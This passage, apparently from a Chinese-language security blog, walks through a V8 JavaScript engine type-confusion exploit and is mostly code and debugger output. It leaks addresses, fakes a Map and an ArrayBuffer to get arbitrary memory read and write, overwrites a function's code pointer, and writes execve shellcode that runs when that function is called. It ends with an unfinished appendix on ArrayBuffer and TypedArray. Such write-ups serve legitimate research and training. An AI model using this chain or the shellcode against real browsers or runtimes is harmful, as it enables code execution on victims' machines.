class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">要被leak的ArrayBuffer</span><br><span class="line">DebugPrint: 0x130c771022d9: [JSArrayBuffer]</span><br><span class="line"> - map &#x3D; 0x228d52a02f71 [FastProperties]</span><br><span class="line">...</span><br><span class="line">0x228d52a02f71: [Map]</span><br><span class="line"> - type: JS_ARRAY_BUFFER_TYPE</span><br><span class="line">...</span><br><span class="line"> - prototype: 0x34f96880b7b9 &lt;Object map &#x3D; 0x228d52a02fc1&gt;</span><br><span class="line"> - constructor: 0x34f96880b609 &lt;JSFunction ArrayBuffer (sfi &#x3D; 0x157dbc033711)&gt;</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line">34f96880b7b9</span><br><span class="line">34f96880b609</span><br></pre></td></tr></table></figure><h3 id="fake-map并leak出来"><a href="#fake-map并leak出来" class="headerlink" title="fake map并leak出来"></a>fake map并leak出来</h3><p>前后两次gc()，让ab_map_obj这个double array移动到old space里，并且让其和它的elements地址偏移恒定。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">//0xdaba0000daba0000，写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,     <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">6.73490047e-316</span>,            <span class="comment">//这里是固定的标志位，直接打印一个ArrayBuffer，把对应于map这个位置的标志位用对应的double number写进去即可</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use constructor replace it</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x3e0338a149e9: [JSArray] in OldSpace</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> - elements &#x3D; 0x3e0338a14a49 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">           0: -1.1264e+129</span><br><span class="line">           1: 3.4771e-308</span><br><span class="line">           2: 6.7349e-316</span><br><span class="line">         3-4: -1.1264e+129</span><br><span class="line">           5: 0</span><br><span class="line"> &#125;</span><br><span class="line">我们要fake的map在elements里，而elements的前面0x10分别是map和length，所以</span><br><span class="line">0x3e0338a14a49 + 0x10 -0x3e0338a149e9 &#x3D; 0x70</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x3e0338a14a49-1</span><br><span class="line">0x3e0338a14a48:0x000037d6d7302de10x0000000600000000</span><br><span class="line">0x3e0338a14a58:0xdaba0000daba00000x001900c60f00000a</span><br><span class="line">0x3e0338a14a68:0x00000000082003ff0xdaba0000daba0000</span><br><span class="line">0x3e0338a14a78:0xdaba0000daba00000x0000000000000000</span><br><span class="line">0x3e0338a14a88:0x000037d6d73022010x0006b57800000000</span><br></pre></td></tr></table></figure><p>然后将其ab_map_obj的地址leak出来，加上0x70就是我们fake的map的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"要leak出ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br></pre></td></tr></table></figure><p>这里顺便说一句，无论是leak还是fake的时候，得到的都是double，写入的也是按照double写入，这个调试一下就知道了。</p><h3 id="fake-ArrayBuffer并leak出来"><a href="#fake-ArrayBuffer并leak出来" class="headerlink" title="fake ArrayBuffer并leak出来"></a>fake ArrayBuffer并leak出来</h3><p>在map被fake好了之后，我们就可以fake ArrayBuffer得到任意地址读写的原语了。<br>依然是前后两次gc()，然后fake一个ArrayBuffer结构。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr, <span class="comment">//我们fake的map地址</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span> <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure><p>然后将这个fake好的ArrayBuffer的地址leak出来，依然是先leak fake_ab这个JSArray的地址，然后根据偏移0x70找到我们在elements里fake的ArrayBuffer的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br></pre></td></tr></table></figure><p>log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">leak出的map地址是810f1c94a01</span><br><span class="line"></span><br><span class="line">要leak出的fake_ab的数组</span><br><span class="line">DebugPrint: 0x810f1c96e29: [JSArray] in OldSpace</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> - elements &#x3D; 0x810f1c96e89 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">         0-2: 4.3818e-311</span><br><span class="line">           3: 3.47668e-310</span><br><span class="line">         4-5: 3.4771e-308</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">810f1c96e99</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x810f1c96e89-1</span><br><span class="line">0x810f1c96e88:0x0000361a14882de1--&gt;fixedArray真正的map 0x0000000600000000--&gt;fixedArray的length</span><br><span class="line">下面才是我们fake的ArrayBuffer</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x810f1c96e98:0x00000810f1c94a01--&gt;fake map0x00000810f1c94a01--&gt;随便</span><br><span class="line">0x810f1c96ea8:0x00000810f1c94a01--&gt;随便0x0000400000000000--&gt;length</span><br><span class="line">0x810f1c96eb8:0x001900c60f00000a--&gt;backingstore0x001900c60f00000a--&gt;随便</span><br><span class="line">0x810f1c96ec8:0x0000361a148822010x0006913800000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">0x810f1c96e89+0x10-0x810f1c96e29&#x3D;0x70</span><br></pre></td></tr></table></figure><h3 id="将我们fake的ArrayBuffer当成一个JSObject读出来"><a href="#将我们fake的ArrayBuffer当成一个JSObject读出来" class="headerlink" title="将我们fake的ArrayBuffer当成一个JSObject读出来"></a>将我们fake的ArrayBuffer当成一个JSObject读出来</h3><p>我们可以在callback里改掉array的类型，比如将一个double array改成了object array，但是由于type confusion，我们在第二次对arr[0]重新写入值的时候，依然把arr当成一个double array，并将其写入。<br>这样实际上，我们把一个double的数值当成一个object指针写入。</p><p>如下，写入之后，arrr[0]将由于我们fake的arraybuffer的map，被视作一个arraybuffer对待，于是可以用它来初始化一个DataView。</p><p>DataView就可以操作这个fake的ArrayBuffer的BackingStore地址对应的内存。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br></pre></td></tr></table></figure><h3 id="leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore"><a href="#leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore" class="headerlink" title="leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore"></a>leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore</h3><p>由此，我们就可以读取对应于code指针所在地址的code指针的值。<br>如下图log，我需要得到code的地址，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0xac9a5c986c9</span><br><span class="line">0xac9a5c986c9: [Function] in OldSpace</span><br><span class="line"> - map &#x3D; 0x3a6b959824d1 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x2e1993f04669</span><br><span class="line"> - elements &#x3D; 0x21df6cd02251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - initial_map &#x3D; </span><br><span class="line"> - shared_info &#x3D; 0x2e1993f3ceb9 &lt;SharedFunctionInfo&gt;</span><br><span class="line"> - name &#x3D; 0x21df6cd02441 &lt;String[0]: &gt;</span><br><span class="line"> - formal_parameter_count &#x3D; 0</span><br><span class="line"> - kind &#x3D; [ NormalFunction ]</span><br><span class="line"> - context &#x3D; 0x2e1993f03d91 &lt;FixedArray[281]&gt;</span><br><span class="line"> - code &#x3D; 0x19d27c522f01 &lt;Code BUILTIN&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0xac9a5c986c9-1</span><br><span class="line">0xac9a5c986c8:0x00003a6b959824d10x000021df6cd02251</span><br><span class="line">0xac9a5c986d8:0x000021df6cd022510x000021df6cd02321</span><br><span class="line">0xac9a5c986e8:0x00002e1993f3ceb90x00002e1993f03d91</span><br><span class="line">0xac9a5c986f8:0x00002e1993f3d0910x000019d27c522f01--&gt;code</span><br></pre></td></tr></table></figure><p>从图中可以看出来，就是function-1（这个减一是因为v8中指针末位都置为1，需要去掉）+0x38，我们把它leak出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>所以找到这个地址后，我们将其写入fake arraybuffer的backingstore，就能用dataview把这个地址对应的数据读出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><p>但是这个地址，并不是真正的函数对应的执行的代码的入口，它还需要加上0x5f，如图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x19d27c522f01</span><br><span class="line">0x19d27c522f01: [Code]</span><br><span class="line">kind &#x3D; BUILTIN</span><br><span class="line">name &#x3D; InterpreterEntryTrampoline</span><br><span class="line">compiler &#x3D; unknown</span><br><span class="line">Instructions (size &#x3D; 1170)</span><br><span class="line">0x19d27c522f60--&gt;从这开始     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]</span><br><span class="line">0x19d27c522f64     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x19d27c522f68     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">0x19d27c522f6c     c  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f6f     f  0f8512020000   jnz 0x19d27c523187  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f75    15  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f78    18  7410           jz 0x19d27c522f8a  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f7a    1a  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br><span class="line">0x19d27c522f84    24  e857350200     call 0x19d27c5464e0  (Abort)    ;; code: BUILTIN</span><br><span class="line">0x19d27c522f89    29  cc             int3l</span><br><span class="line">0x19d27c522f8a    2a  4885c9         REX.W testq rcx,rcx</span><br><span class="line">0x19d27c522f8d    2d  0f842c030000   jz 0x19d27c5232bf  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f93    33  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f96    36  7410           jz 0x19d27c522fa8  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f98    38  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br></pre></td></tr></table></figure><p>于是我们还要再加上0x5f</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure><h3 id="向函数要执行的代码的地址，写入我们的shellcode"><a href="#向函数要执行的代码的地址，写入我们的shellcode" class="headerlink" title="向函数要执行的代码的地址，写入我们的shellcode"></a>向函数要执行的代码的地址，写入我们的shellcode</h3><p>同上，将函数要执行的代码的地址写入到BackingStore，并用dataview向这个地址写入shellcode。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-09-051114.png" alt=""></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个buffer</li><li>BackingStore——可以使用TypedArray/DataView，指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef</li></ul>  <strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong><ul><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = 